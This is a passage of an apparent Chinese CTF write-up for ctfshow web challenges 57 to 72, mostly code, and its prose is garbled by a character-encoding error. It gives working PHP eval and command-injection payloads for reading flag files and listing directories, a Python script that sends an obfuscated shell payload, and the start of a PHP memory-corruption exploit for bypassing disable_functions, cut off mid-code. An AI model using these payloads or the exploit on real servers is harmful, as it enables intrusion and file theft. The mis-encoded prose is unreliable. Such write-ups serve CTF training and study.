</span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=---------------------------30303294254096021847704335588</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>343</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://127.0.0.1</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://127.0.0.1/</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">-----------------------------30303294254096021847704335588</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;file&quot;; filename=&quot;1.txt&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: <span class="type">text</span>/plain</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">cat flag.php</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">-----------------------------30303294254096021847704335588</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;submit&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">??æµœ?</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">-----------------------------30303294254096021847704335588--</span></span></span><br><span class="line"><span class="language-pgsql"></span></span><br></pre></td></tr></table></figure><h3 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// è¿˜èƒ½ç‚«çš„åŠ¨å—ï¼Ÿ</span></span><br><span class="line"><span class="comment">//flag in 36.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat &quot;</span>.<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨shellä¸­å¯ä»¥åˆ©ç”¨<code>$</code>å’Œ<code>()</code>è¿›è¡Œæ„é€ æ•°å­—</p><blockquote><p><code>$(())</code> ä»£è¡¨åšä¸€æ¬¡è¿ç®—ï¼Œå› ä¸ºé‡Œé¢ä¸ºç©ºï¼Œä¹Ÿè¡¨ç¤ºå€¼ä¸º0<br><code>$((~$(())))</code> å¯¹0ä½œå–åè¿ç®—ï¼Œå€¼ä¸º-1<br><code>$(($((~$(())))$((~$(())))))</code> -1-1ï¼Œä¹Ÿå°±æ˜¯(-1)+(-1)ä¸º-2ï¼Œæ‰€ä»¥å€¼ä¸º-2<br><code>$((~$(($((~$(())))$((~$(())))))))</code> å†å¯¹-2åšä¸€æ¬¡å–åå¾—åˆ°1ï¼Œæ‰€ä»¥å€¼ä¸º1</p><p>å¦‚æœå¯¹<code>a</code>æŒ‰ä½å–åï¼Œåˆ™å¾—åˆ°çš„ç»“æœä¸º<code>-(a+1)</code>ï¼Œä¹Ÿå°±æ˜¯å¯¹0å–åå¾—åˆ°-1</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url = <span class="string">&#x27;http://373648e5-52f2-4eb8-a837-45fa0c6d15df.challenge.ctf.show/&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;/?c=&#x27;</span> +<span class="string">&#x27;$((~((&#x27;</span> + <span class="string">&#x27;$((~$(())))&#x27;</span>*<span class="number">37</span> + <span class="string">&#x27;))))&#x27;</span> </span><br><span class="line">reponse = requests.get(url=url+payload)</span><br><span class="line">flag = re.findall(<span class="string">&#x27;ctfshow&#123;.*?&#125;&#x27;</span>, reponse.text)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>èšå‰‘å¯ä»¥ç›´æ¥è¿æ¥ï¼ˆ<code>åé¢çš„é¢˜ç›®éƒ½å¯ä»¥</code>ï¼‰ï¼Œä¹Ÿå¯ä»¥é€šè¿‡å¦‚ä¸‹å‘½ä»¤è¯»å–</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">c=show_source(&#x27;flag.php&#x27;);</span><br><span class="line">c=include$_POST[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p>ä¸€äº›è¯»å–æ–‡ä»¶å‡½æ•°</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">php_strip_whitespace</span>(<span class="variable">$filename</span>));</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>));</span><br><span class="line"><span class="title function_ invoke__">readfile</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">file</span>(<span class="variable">$filename</span>)); <span class="comment">// var_dump</span></span><br><span class="line"><span class="title function_ invoke__">fread</span>(<span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>,<span class="string">&quot;r&quot;</span>), <span class="variable">$size</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$filename</span>); <span class="comment">// éphpä»£ç </span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="variable">$filename</span>); <span class="comment">// éphpä»£ç </span></span><br><span class="line"><span class="keyword">require</span>(<span class="variable">$filename</span>); <span class="comment">// éphpä»£ç </span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="variable">$filename</span>); <span class="comment">// éphpä»£ç </span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">fread</span>(<span class="title function_ invoke__">popen</span>(<span class="string">&quot;cat flag&quot;</span>, <span class="string">&quot;r&quot;</span>), <span class="variable">$size</span>));</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">fgets</span>(<span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&quot;r&quot;</span>))); <span class="comment">// è¯»å–ä¸€è¡Œ</span></span><br><span class="line"><span class="title function_ invoke__">fpassthru</span>(<span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&quot;r&quot;</span>)); <span class="comment">// ä»å½“å‰ä½ç½®ä¸€ç›´è¯»å–åˆ° EOF</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">fgetcsv</span>(<span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>,<span class="string">&quot;r&quot;</span>), <span class="variable">$size</span>));</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">fgetss</span>(<span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&quot;r&quot;</span>))); <span class="comment">// ä»æ–‡ä»¶æŒ‡é’ˆä¸­è¯»å–ä¸€è¡Œå¹¶è¿‡æ»¤æ‰ HTML æ ‡è®°</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">fscanf</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;r&quot;</span>),<span class="string">&quot;%s&quot;</span>));</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">parse_ini_file</span>(<span class="variable">$filename</span>)); <span class="comment">// å¤±è´¥æ—¶è¿”å› false , æˆåŠŸè¿”å›é…ç½®æ•°ç»„</span></span><br></pre></td></tr></table></figure><h3 id="web59-65"><a href="#web59-65" class="headerlink" title="web59-65"></a>web59-65</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">c=show_source(&#x27;flag.php&#x27;);</span><br><span class="line">c=include$_POST[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h3 id="web66"><a href="#web66" class="headerlink" title="web66"></a>web66</h3><p><code>show_source</code>è¢«<code>ban</code>äº†ï¼Œè€Œä¸”<code>flag</code>ä¸åœ¨<code>flag.php</code>ï¼Œéœ€è¦æŸ¥çœ‹ç›®å½•æ‰¾</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">c=print_r(scandir(&quot;/&quot;));</span><br><span class="line">c=highlight_file(&#x27;/flag.txt&#x27;);</span><br><span class="line">c=include$_POST[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=/flag.txt</span><br></pre></td></tr></table></figure><h3 id="web67"><a href="#web67" class="headerlink" title="web67"></a>web67</h3><p><code>print_r</code>è¢«<code>ban</code>äº†</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">c=var_dump(scandir(&quot;/&quot;));</span><br><span class="line">c=highlight_file(&#x27;/flag.txt&#x27;);</span><br><span class="line">c=include$_POST[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=/flag.txt</span><br></pre></td></tr></table></figure><h3 id="web68"><a href="#web68" class="headerlink" title="web68"></a>web68</h3><p>æ— æºç ï¼Œ<code>highlight_file</code>è¢«<code>ban</code>äº†</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">c=var_dump(scandir(&quot;/&quot;));</span><br><span class="line">c=include(&#x27;/flag.txt&#x27;);</span><br><span class="line">c=include$_POST[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=/flag.txt</span><br></pre></td></tr></table></figure><h3 id="web69"><a href="#web69" class="headerlink" title="web69"></a>web69</h3><p><code>var_dump</code>è¢«<code>ban</code>äº†</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">c=$d=opendir(&quot;/&quot;);while(false!==($f=readdir($d)))&#123;echo&quot;$f\n&quot;;&#125;</span><br><span class="line">c=include(&#x27;/flag.txt&#x27;);</span><br><span class="line">c=include$_POST[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=/flag.txt</span><br></pre></td></tr></table></figure><blockquote><p>å‡ ç§æŸ¥çœ‹ç›®å½•çš„æ–¹æ³•</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">glob</span>(<span class="string">&quot;*&quot;</span>)); <span class="comment">// åˆ—å½“å‰ç›®å½•</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">glob</span>(<span class="string">&quot;/*&quot;</span>)); <span class="comment">// åˆ—æ ¹ç›®å½•</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;.&quot;</span>));</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;/&quot;</span>));</span><br><span class="line"><span class="variable">$d</span>=<span class="title function_ invoke__">opendir</span>(<span class="string">&quot;.&quot;</span>);<span class="keyword">while</span>(<span class="literal">false</span>!==(<span class="variable">$f</span>=<span class="title function_ invoke__">readdir</span>(<span class="variable">$d</span>)))&#123;<span class="keyword">echo</span><span class="string">&quot;<span class="subst">$f</span>\n&quot;</span>;&#125;</span><br><span class="line"><span class="variable">$d</span>=<span class="title function_ invoke__">dir</span>(<span class="string">&quot;.&quot;</span>);<span class="keyword">while</span>(<span class="literal">false</span>!==(<span class="variable">$f</span>=<span class="variable">$d</span>-&gt;<span class="title function_ invoke__">read</span>()))&#123;<span class="keyword">echo</span><span class="variable">$f</span>.<span class="string">&quot;\n&quot;</span>;&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">glob</span>(<span class="string">&quot;/*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$value</span>)&#123;<span class="keyword">echo</span> <span class="variable">$value</span>.<span class="string">&quot;   &quot;</span>;&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&#x27;glob:///*&#x27;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&quot; &quot;</span>);&#125;</span><br></pre></td></tr></table></figure><h3 id="web70"><a href="#web70" class="headerlink" title="web70"></a>web70</h3><p>æ— æºç </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">c=$d=opendir(&quot;/&quot;);while(false!==($f=readdir($d)))&#123;echo&quot;$f\n&quot;;&#125;</span><br><span class="line">c=include(&#x27;/flag.txt&#x27;);</span><br><span class="line">c=include$_POST[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=/flag.txt</span><br></pre></td></tr></table></figure><h3 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h3><p>æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¼ºåˆ¶é€€å‡ºï¼Œä¸æ‰§è¡Œåé¢çš„å‘½ä»¤å³å¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">c=$d=opendir(&quot;/&quot;);while(false!==($f=readdir($d)))&#123;echo&quot;$f\n&quot;;&#125;;exit();</span><br><span class="line">c=include(&#x27;/flag.txt&#x27;);exit();</span><br></pre></td></tr></table></figure><h3 id="web72"><a href="#web72" class="headerlink" title="*web72"></a>*web72</h3><p>æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ¢ä¸€ä¸ªæŸ¥çœ‹ç›®å½•æ–¹æ³•</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">c=$a=new DirectoryIterator(&#x27;glob:///*&#x27;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;;exit();</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯<code>include</code>è¢«<code>ban</code>äº†ï¼Œå¹¶ä¸”æœ‰<code>open_basedir</code>å’Œ<code>disable_functions</code>çš„é™åˆ¶ï¼Œè¯•äº†è¯•èšå‰‘ä¹Ÿä¸è¡Œäº†ï¼Œä½¿ç”¨åˆ«äººçš„è„šæœ¬</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ctfshow</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;<span class="title function_ invoke__">getTrace</span>();</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$backtrace</span> = <span class="title function_ invoke__">debug_backtrace</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$v</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; </span><br><span class="line"></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; </span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; 